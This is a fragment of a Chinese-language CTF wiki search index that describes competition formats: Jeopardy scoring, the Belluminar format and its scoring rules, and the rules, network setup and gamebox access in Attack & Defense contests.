\u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002 \u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar \u00b6 \u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/ \u8d5b\u5236\u4ecb\u7ecd \u00b6 Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002 \u51fa\u9898\u9636\u6bb5 \u00b6 Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002 \u63d0\u4ea4\u90e8\u7f72 \u00b6 \u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002 \u89e3\u9898\u7ade\u6280 \u00b6 \u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002 \u5206\u4eab\u8ba8\u8bba \u00b6 \u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002 \u8ba1\u5206\u89c4\u5219 \u00b6 \u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002 \u8d5b\u5236\u603b\u8bc4 \u00b6 \u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002 \u653b\u9632\u6a21\u5f0f - Attack & Defense \u00b6 \u6982\u8ff0 \u00b6 \u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4f1a\u8bbe\u7f6e\u5f97\u5206\uff0c\u4e00\u822c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002 \u57fa\u672c\u89c4\u5219 \u00b6 \u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002 \u7f51\u7edc\u73af\u5883 \u00b6 \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3 \u8bbf\u95ee Gamebox \u00b6 \u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u901a\u8fc7 ssh \u767b\u5f55\uff0c\u5bc6\u7801\u6216\u8005\u79c1\u94a5\uff0c\u4e00\u822c\u4f1a\u7ed9\u51fa\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"Mode"},{"location":"introduction/mode/#-jeopardy","text":"\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 